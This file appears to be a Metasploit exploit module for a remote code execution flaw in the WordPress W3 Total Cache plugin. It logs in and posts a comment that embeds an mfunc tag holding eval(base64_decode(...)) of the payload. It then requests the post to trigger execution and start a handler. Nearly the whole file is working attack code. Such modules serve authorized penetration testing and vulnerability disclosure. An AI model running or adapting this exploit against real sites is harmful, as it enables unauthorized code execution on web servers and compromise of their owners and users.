##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info={})
		super(update_info(info,
											'Name'           => "Wordpress W3TotalCache Remote Code Execution",
											'Description'    => %q{
												Wordpress pugin W3TotalCache before 0.9.2.9 has a Remote Code Exection via comments.
											},
											'License'        => MSF_LICENSE,
											'Author'         =>
													[
															'Christian Mehlmauer' # metasploit module
													],
											'References'     =>
													[
															['URL', 'http://wordpress.org/support/topic/pwn3d'],
															['URL', 'http://blog.sucuri.net/2013/04/update-wp-super-cache-and-w3tc-immediately-remote-code-execution-vulnerability-disclosed.html']
													],
											'Arch'           => ARCH_PHP,
											'Platform'       => ['php'],
											'Targets'        => [[ 'Automatic', { }]],
											'Privileged'     => false,
											'Payload'        =>
											{
											'DisableNops' => true,
											# Arbitrary big number. The payload gets sent as an HTTP
											# response body, so really it's unlimited
											'Space'       => 262144, # 256k
											},
											'DisclosureDate' => "Apr 24 2013",
											'DefaultTarget'  => 0))

		register_options(
				[
						OptString.new('USERNAME', [true, 'Wordpress Username', 'test']),
						OptString.new('PASSWORD', [true, 'Wordpress Password', 'test']),
						OptString.new('PATH', [true, 'Path to wordpress', '/']),
						OptInt.new('POST', [true, 'Valid Post ID with comments enabled', 1])
				], self.class)
	end

	def login()
		uri = normalize_uri(target_uri, datastore['PATH'], "wp-login.php")
		redirect_uri = normalize_uri(target_uri, datastore['PATH'])
		login = {}
		login['log'] = datastore['USERNAME']
		login['pwd'] = datastore['PASSWORD']
		login['wp-submit'] = "Log+In"
		login['redirect_to'] = redirect_uri
		login['testcookie'] = "1"
		res = send_request_cgi({
														'method'  => 'POST',
														'uri'     => uri,
														'vars_post' => login
												})
		if res
			vprint_status("Login-Status: #{res.code}")
			login_redirect = res.headers['Location']
			vprint_status("Login-Redirect: #{login_redirect}")
			# successful login (redirect to redirect_uri)
			if res and res.code.to_s =~ /30[0-9]/ and login_redirect == datastore['PATH']
				resp_cookies = res.headers['Set-Cookie']
				cookies_split = resp_cookies.split(',')
				cookies = []
				for c in cookies_split
					co = c.split(';')
					real_cookie = co[0].strip
					cookies << real_cookie
				end
				return cookies
			else
				fail_with(Exploit::Failure::Unknown, 'Could not log in')
			end
		end
		fail_with(Exploit::Failure::Unknown, 'Could not log in')
	end

	def post_comment(cookie)
		b64_payload = Rex::Text.encode_base64(payload.encoded)
		uri = normalize_uri(target_uri, datastore['PATH'], 'wp-comments-post.php')
		wp_payload = "<!-- mfunc error_reporting(0);eval(base64_decode('#{b64_payload}')); --><!-- /mfunc-->"
		comment = {}
		comment['comment'] = "#{rand_text_alpha(10)}\n#{wp_payload}"
		comment['Submit'] = 'Submit+Comment'
		comment['comment_post_ID'] = datastore['POST'].to_s
		comment['comment_parent'] = '0'
		send_request_cgi({
												'method'  => 'POST',
												'uri'     => uri,
												'cookie'		=> cookie.join(';'),
												'vars_post' => comment })
	end

	def call_post(cookie)
		uri = normalize_uri(target_uri, datastore['PATH'])
		res = send_request_cgi({
															'method'  => 'GET',
															'uri'     => uri,
															'vars_get' => { 'p' => datastore['POST'].to_s }
														})
		if res
			redirect = res.headers['Location']
			# Follow redirection
			if res.code.to_s =~ /30[0-9]/ and redirect
				vprint_status("Following redirection to #{redirect}")
				res2 = send_request_raw(
				{
					'uri' => URI.parse(redirect).path,
					'method' => 'GET',
					'cookie'		=> cookie.join(';')
				})
			end
			return res2
		end
	end

	def exploit
		print_status("Logging in")
		cred = login()

		print_status("Posting malicious comment")
		post_comment(cred)

		print_status("Calling Post")
		call_post(cred)

		handler
	end
end
